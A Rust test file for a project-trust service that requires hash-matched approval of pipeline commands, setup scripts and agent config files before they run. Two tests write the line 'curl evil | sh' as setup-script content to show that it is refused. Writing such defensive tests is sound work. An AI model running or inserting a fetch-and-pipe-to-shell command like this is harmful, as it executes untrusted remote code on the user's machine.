use std::fs::{create_dir_all, read_to_string, write};
use std::sync::atomic::{AtomicI64, AtomicUsize, Ordering};
use std::time::{Duration, SystemTime};

use natamux_agents::hook_files::{WorkspaceHooks, exclude_from_git, workspace_file};
use natamux_core::security::{Forced, SecurityMode, StrictSettings, force};
use natamux_git::test_support::{TempDir, run_git};
use natamux_proto::projects::repo_trust::SetupScript;
use serde_json::json;
use sha2::{Digest, Sha256};

use super::*;
use crate::projects::repo_trust_files::{feed, hex};
use crate::projects::repos::RepoOptions;
use crate::projects::settings_parse::SETTINGS_FILE;
use crate::workspaces::setup_script::SETUP_SCRIPT;

const CHECKED: &str = r#"{"stages":[{"id":"context","kind":"context","gate":"manual"},{"id":"test","kind":"agent","gate":"auto","check":"pnpm test"}]}"#;

/// Strict mode on this thread: only the exact approved content is trusted.
fn strict() -> Forced {
    force(SecurityMode::Strict(StrictSettings::default()))
}

struct Setup {
    base: TempDir,
    repos: Arc<Repos>,
    clock: Arc<AtomicI64>,
}

/// Projects "default" (`<dir>/folder`) and "other" (`<dir>/other`), and no trust file.
fn seed(dir: &Path) -> PathBuf {
    let data = dir.join("data");
    create_dir_all(&data).unwrap();
    let mut list = Vec::new();
    for (id, folder) in [("default", "folder"), ("other", "other")] {
        create_dir_all(dir.join(folder)).unwrap();
        let path = dir.join(folder).to_string_lossy().to_string();
        list.push(json!({ "id": id, "name": id, "path": path }));
    }
    write(data.join("repos.json"), json!(list).to_string()).unwrap();
    data
}

fn setup() -> Setup {
    let base = TempDir::new("trust");
    let data = seed(base.path());
    let clock = Arc::new(AtomicI64::new(0));
    let ticks = Arc::clone(&clock);
    let repos = Repos::new(&data, Arc::new(move || ticks.load(Ordering::SeqCst)));
    Setup { base, repos, clock }
}

impl Setup {
    fn folder(&self) -> PathBuf {
        self.base.path().join("folder")
    }

    /// Writes the settings; the service looks at the file again a second later.
    fn settings(&self, text: &str) {
        let file = self.folder().join(SETTINGS_FILE);
        write(&file, text).unwrap();
        let step = self.clock.fetch_add(1000, Ordering::SeqCst) / 1000 + 1;
        // A later modified time, so a rewrite counts as a change on a file system with coarse
        // times (Windows): the service reads the file again only when its time changed.
        let at = SystemTime::now() + Duration::from_secs(5 * u64::try_from(step).unwrap());
        std::fs::File::options()
            .write(true)
            .open(&file)
            .unwrap()
            .set_modified(at)
            .unwrap();
    }

    fn view(&self) -> RepoTrustView {
        self.repos.trust_view("default").unwrap()
    }
}

#[test]
fn lists_every_command_in_pipeline_order_with_where_it_comes_from() {
    let value = json!({ "stages": [
        { "id": "spec", "kind": "agent", "gate": "auto", "args": "--model x", "check": " " },
        { "id": "kind", "paths": [
            { "id": "bug", "when": { "type": "command", "run": "grep -q bug x" },
              "stages": [{ "id": "fix", "kind": "testing", "gate": "auto", "command": "make" }] },
            { "id": "other", "stages": [{ "id": "plan", "kind": "agent", "gate": "auto" }] },
        ] },
        { "id": "build", "parallel": [
            { "id": "test", "kind": "agent", "gate": "auto", "check": "pnpm test" },
        ] },
    ] });
    let settings: ProjectSettings = serde_json::from_value(value).unwrap();

    let listed: Vec<(String, String)> = commands_of(&settings)
        .into_iter()
        .map(|command| (command.place, command.text))
        .collect();

    let pair = |place: &str, text: &str| (place.to_string(), text.to_string());
    assert_eq!(
        listed,
        [
            pair("Stage spec: args", "--model x"),
            pair("Path bug of kind: when command", "grep -q bug x"),
            pair("Stage fix: command", "make"),
            pair("Stage test: check", "pnpm test"),
        ]
    );
}

#[test]
fn trusts_a_project_with_no_commands_and_no_setup_script_without_an_approval() {
    let s = setup();
    assert!(s.view().trusted);
    assert!(s.repos.is_trusted(None));
    assert!(s.view().commands.is_empty());
}

#[test]
fn trusts_the_commands_only_after_the_approval_of_the_hash_that_was_shown() {
    let s = setup();
    s.settings(CHECKED);
    let shown = s.view();
    assert!(!shown.trusted);
    assert!(!s.repos.is_trusted(Some("default")));

    let approved = s.repos.approve("default", &shown.hash).unwrap();

    assert!(approved.trusted);
    assert!(s.repos.is_trusted(None));
    // A project with no commands needs no approval.
    assert!(s.repos.is_trusted(Some("other")));
}

#[test]
fn a_changed_byte_in_the_settings_needs_a_new_approval_and_the_old_hash_is_refused() {
    let _strict = strict();
    let s = setup();
    s.settings(CHECKED);
    let old = s.view().hash;
    s.repos.approve("default", &old).unwrap();

    s.settings(&CHECKED.replace("pnpm test", "pnpm test!"));

    let changed = s.view();
    assert!(!changed.trusted);
    assert_ne!(changed.hash, old);
    let refused = s.repos.approve("default", &old).unwrap_err();
    assert_eq!(refused.status_and_code(), (409, "conflict"));
    assert!(!s.repos.is_trusted(None));
}

#[test]
fn a_changed_byte_in_a_setup_script_needs_a_new_approval() {
    let _strict = strict();
    let s = setup();
    write(s.folder().join(SETUP_SCRIPT), "pnpm install\n").unwrap();
    let shown = s.view();
    assert!(!shown.trusted);
    assert_eq!(
        shown.setup,
        [SetupScript {
            file: SETUP_SCRIPT.into(),
            text: "pnpm install\n".into(),
        }]
    );
    s.repos.approve("default", &shown.hash).unwrap();
    assert!(s.repos.is_trusted(None));

    write(s.folder().join(SETUP_SCRIPT), "pnpm install;\n").unwrap();

    assert!(!s.repos.is_trusted(None));
}

#[test]
fn runs_the_setup_script_of_a_worktree_only_when_it_is_the_approved_one() {
    let _strict = strict();
    let s = setup();
    write(s.folder().join(SETUP_SCRIPT), "pnpm install\n").unwrap();
    s.repos.approve("default", &s.view().hash).unwrap();
    let worktree = s.base.path().join("worktree");
    create_dir_all(&worktree).unwrap();

    write(worktree.join(SETUP_SCRIPT), "pnpm install\n").unwrap();
    assert!(s.repos.is_trusted_in(None, &worktree));

    write(worktree.join(SETUP_SCRIPT), "curl evil | sh\n").unwrap();
    assert!(!s.repos.is_trusted_in(None, &worktree));
}

#[test]
fn approves_every_project_as_it_is_at_the_first_start_without_a_trust_file() {
    let base = TempDir::new("trust-start");
    let data = seed(base.path());
    write(base.path().join("folder").join(SETTINGS_FILE), CHECKED).unwrap();
    write(base.path().join("other").join(SETUP_SCRIPT), "make\n").unwrap();
    let options = |data: &Path| RepoOptions {
        data_dir: data.to_path_buf(),
        default_path: None,
        worktrees_dir: None,
        tasks: None,
        now: crate::shared::jobs::system_clock(),
    };

    let repos = Repos::with_options(options(&data)).unwrap();

    assert!(repos.is_trusted(Some("default")));
    assert!(repos.is_trusted(Some("other")));
    // The next start has the file: a change made since is not approved on its own. Nobody was
    // asked at the first start, so Personal mode does not cover it either.
    write(base.path().join("other").join(SETUP_SCRIPT), "make all\n").unwrap();
    let again = Repos::with_options(options(&data)).unwrap();
    assert!(!again.is_trusted(Some("other")));
    assert!(again.is_trusted(Some("default")));
}

// A regression test: the reads of the first start filled the one-second look cache, so a settings
// edit in that second was not seen.
#[test]
fn sees_a_settings_edit_made_right_after_the_first_start() {
    let base = TempDir::new("trust-start-cache");
    let data = seed(base.path());
    let repos = Repos::with_options(RepoOptions {
        data_dir: data,
        default_path: None,
        worktrees_dir: None,
        tasks: None,
        now: Arc::new(|| 0_i64),
    })
    .unwrap();

    write(base.path().join("folder").join(SETTINGS_FILE), CHECKED).unwrap();

    assert!(!repos.is_trusted(Some("default")));
}

#[test]
fn forgets_the_approval_of_a_removed_project() {
    let s = setup();
    s.settings(CHECKED);
    s.repos.approve("default", &s.view().hash).unwrap();
    let file = s.base.path().join("data").join(TRUST_FILE);
    assert!(read_to_string(&file).unwrap().contains("\"default\""));

    s.repos.remove("default").unwrap();

    assert!(!read_to_string(&file).unwrap().contains("\"default\""));
}

#[test]
fn a_settings_save_approves_the_commands_written_but_not_an_unseen_setup_script() {
    let s = setup();
    let body: Value = serde_json::from_str(CHECKED).unwrap();
    s.repos.approve_saved("default", &body).unwrap();
    s.settings(CHECKED);
    assert!(s.repos.is_trusted(None));

    write(s.folder().join(SETUP_SCRIPT), "curl evil | sh\n").unwrap();
    s.repos.approve_saved("default", &body).unwrap();
    assert!(!s.repos.is_trusted(None));
}

#[test]
fn tells_the_dashboards_when_the_trust_of_a_project_changes() {
    let s = setup();
    let bus = EventBus::new();
    let heard = Arc::new(AtomicUsize::new(0));
    let count = Arc::clone(&heard);
    bus.subscribe(move |message| {
        if matches!(message, DaemonMessage::ReposChanged) {
            count.fetch_add(1, Ordering::SeqCst);
        }
    });
    s.repos.set_trust_bus(bus);
    assert!(s.view().trusted);
    assert_eq!(heard.load(Ordering::SeqCst), 0);

    s.settings(CHECKED);
    assert!(!s.view().trusted);
    assert!(!s.view().trusted);

    assert_eq!(heard.load(Ordering::SeqCst), 1);
}

#[test]
fn an_unknown_project_is_not_trusted() {
    let s = setup();
    assert!(!s.repos.is_trusted(Some("missing")));
}

#[test]
fn a_repo_with_only_an_agent_config_file_is_trusted_only_after_its_approval() {
    let s = setup();
    create_dir_all(s.folder().join(".codex")).unwrap();
    write(s.folder().join(".codex/config.toml"), "[mcp_servers.x]\n").unwrap();

    let shown = s.view();
    assert!(!shown.trusted);
    assert!(!s.repos.is_trusted(None));
    assert_eq!(
        shown.agent_files,
        [SetupScript {
            file: ".codex/config.toml".into(),
            text: "[mcp_servers.x]\n".into(),
        }]
    );

    s.repos.approve("default", &shown.hash).unwrap();
    assert!(s.repos.is_trusted(None));
}

#[test]
fn a_changed_byte_in_an_agent_config_file_needs_a_new_approval() {
    let _strict = strict();
    let s = setup();
    write(s.folder().join(".mcp.json"), "{}\n").unwrap();
    s.repos.approve("default", &s.view().hash).unwrap();
    assert!(s.repos.is_trusted(None));

    write(s.folder().join(".mcp.json"), "{ }\n").unwrap();

    assert!(!s.repos.is_trusted(None));
    // The check of a worktree reads the worktree: the approved bytes there are trusted.
    let worktree = s.base.path().join("worktree");
    create_dir_all(&worktree).unwrap();
    write(worktree.join(".mcp.json"), "{ }\n").unwrap();
    assert!(!s.repos.is_trusted_in(None, &worktree));
    write(worktree.join(".mcp.json"), "{}\n").unwrap();
    assert!(s.repos.is_trusted_in(None, &worktree));
}

// T-0373: only Natamux's exact text, untracked and kept out of git, is its own. The old rule
// left out every file at a Natamux path, also one a repo committed.
#[test]
fn only_the_exact_agent_config_natamux_writes_and_keeps_out_of_git_needs_no_approval() {
    let s = setup();
    run_git(&s.folder(), &["init", "-q"]);
    for agent in ["codex", "gemini"] {
        let file = workspace_file(agent, WorkspaceHooks::default()).unwrap();
        let path = s.folder().join(file.path);
        create_dir_all(path.parent().unwrap()).unwrap();
        write(path, file.content).unwrap();
        exclude_from_git(&s.folder(), &format!("/{}", file.path));
    }

    assert!(s.view().trusted);
    assert!(s.view().agent_files.is_empty());

    create_dir_all(s.folder().join(".cursor")).unwrap();
    write(s.folder().join(".cursor/hooks.json"), "{}\n").unwrap();
    exclude_from_git(&s.folder(), "/.cursor/hooks.json");
    let view = s.view();
    assert!(!view.trusted);
    assert_eq!(view.changed, [".cursor/hooks.json"]);
}

#[test]
fn a_settings_save_does_not_approve_an_unseen_agent_config_file() {
    let s = setup();
    let body: Value = serde_json::from_str(CHECKED).unwrap();
    s.settings(CHECKED);
    write(s.folder().join(".mcp.json"), "{}\n").unwrap();

    s.repos.approve_saved("default", &body).unwrap();

    assert!(!s.repos.is_trusted(None));
}

// Approvals stored before agent files counted must stay valid for a repo without them.
#[test]
fn the_hash_of_a_repo_without_agent_files_is_the_same_as_before() {
    let commands = [RepoCommand {
        place: "Stage test: check".into(),
        text: "pnpm test".into(),
    }];
    let setup = [(SETUP_SCRIPT.to_string(), b"make\n".to_vec())];
    // The hash as it was before agent files joined it.
    let mut hasher = Sha256::new();
    feed(&mut hasher, b"commands");
    for command in &commands {
        feed(&mut hasher, command.place.as_bytes());
        feed(&mut hasher, command.text.as_bytes());
    }
    feed(&mut hasher, b"setup");
    feed(&mut hasher, files_hash(&setup).as_bytes());

    assert_eq!(hash_of(&commands, &setup, &[]), hex(hasher));
    let agents = [(".mcp.json".to_string(), b"{}".to_vec())];
    assert_ne!(
        hash_of(&commands, &setup, &agents),
        hash_of(&commands, &setup, &[])
    );
}

#[test]
fn reads_an_approval_stored_before_agent_files_counted() {
    let text = r#"{"path":"/p","hash":"ab","setup":"cd"}"#;
    let approval: Approval = serde_json::from_str(text).unwrap();
    assert_eq!(approval.agents, "");
    assert!(approval.extra.is_empty());
}

// The owner's bug (T-0389): a worktree whose agent config differed from the project folder
// started its agent without auto mode. Personal mode trusts a project once, like an editor.
#[test]
fn personal_mode_trusts_every_folder_of_an_approved_project_after_any_change() {
    let s = setup();
    s.settings(CHECKED);
    write(s.folder().join(SETUP_SCRIPT), "pnpm install\n").unwrap();
    write(s.folder().join(".mcp.json"), "{}\n").unwrap();
    s.repos.approve("default", &s.view().hash).unwrap();
    let worktree = s.base.path().join("worktree");
    create_dir_all(worktree.join(".claude/skills/x")).unwrap();
    write(worktree.join(".claude/skills/x/SKILL.md"), "do more\n").unwrap();
    write(worktree.join(SETUP_SCRIPT), "make\n").unwrap();

    s.settings(&CHECKED.replace("pnpm test", "pnpm test!"));
    write(s.folder().join(".mcp.json"), "{ }\n").unwrap();

    assert!(s.repos.is_trusted_in(None, &worktree));
    assert!(s.repos.is_trusted(None));
    let view = s.view();
    assert!(view.trusted);
    assert!(view.changed.is_empty());
    let _strict = strict();
    assert!(!s.repos.is_trusted_in(None, &worktree));
    assert!(!s.repos.is_trusted(None));
}

// A settings save writes a record without asking anyone: it must not trust what comes later.
#[test]
fn a_settings_save_alone_does_not_cover_later_agent_config_but_an_approval_does() {
    let s = setup();
    let body: Value = serde_json::from_str(CHECKED).unwrap();
    s.repos.approve_saved("default", &body).unwrap();
    s.settings(CHECKED);
    assert!(s.repos.is_trusted(None));
    assert!(!s.view().covered);

    write(s.folder().join(".mcp.json"), "{}\n").unwrap();
    assert!(!s.repos.is_trusted(None));

    s.repos.approve("default", &s.view().hash).unwrap();
    assert!(s.view().covered);
    write(s.folder().join(".mcp.json"), "{ }\n").unwrap();
    assert!(s.repos.is_trusted(None));
}

// A save writes a new record. The approval has no agent file here, so only the kept mark makes
// the project stay approved.
#[test]
fn a_save_after_an_approval_keeps_the_project_approved() {
    let s = setup();
    let body: Value = serde_json::from_str(CHECKED).unwrap();
    s.settings(CHECKED);
    s.repos.approve("default", &s.view().hash).unwrap();

    s.repos.approve_saved("default", &body).unwrap();
    write(s.folder().join(".mcp.json"), "{}\n").unwrap();

    assert!(s.repos.is_trusted(None));
    assert!(s.view().covered);
}

// Approving in a task's worktree is the user's approval of the project too.
#[test]
fn an_approval_in_a_worktree_covers_the_project() {
    let s = setup();
    let body: Value = serde_json::from_str(CHECKED).unwrap();
    s.repos.approve_saved("default", &body).unwrap();
    s.settings(CHECKED);
    let worktree = s.base.path().join("worktree");
    create_dir_all(&worktree).unwrap();
    write(worktree.join(".mcp.json"), "{}\n").unwrap();
    let shown = s.repos.trust_view_in("default", Some(&worktree)).unwrap();
    assert!(!shown.trusted && !shown.covered);

    s.repos
        .approve_in("default", Some(&worktree), &shown.hash)
        .unwrap();

    assert!(s.view().covered);
    assert!(s.repos.is_trusted_in(None, &worktree));
}

#[test]
fn an_unverifiable_folder_is_trusted_only_for_an_approved_project_in_personal_mode() {
    let s = setup();
    let big = "x".repeat(1024 * 1024 + 1);
    write(s.folder().join(".mcp.json"), &big).unwrap();
    let view = s.view();
    assert!(!view.trusted && view.unverifiable.is_some());
    assert!(s.repos.approve("default", &view.hash).is_err());

    write(s.folder().join(".mcp.json"), "{}\n").unwrap();
    s.repos.approve("default", &s.view().hash).unwrap();
    let worktree = s.base.path().join("worktree");
    create_dir_all(&worktree).unwrap();
    write(worktree.join(".mcp.json"), &big).unwrap();
    assert!(s.repos.is_trusted_in(None, &worktree));
    let _strict = strict();
    assert!(!s.repos.is_trusted_in(None, &worktree));
}
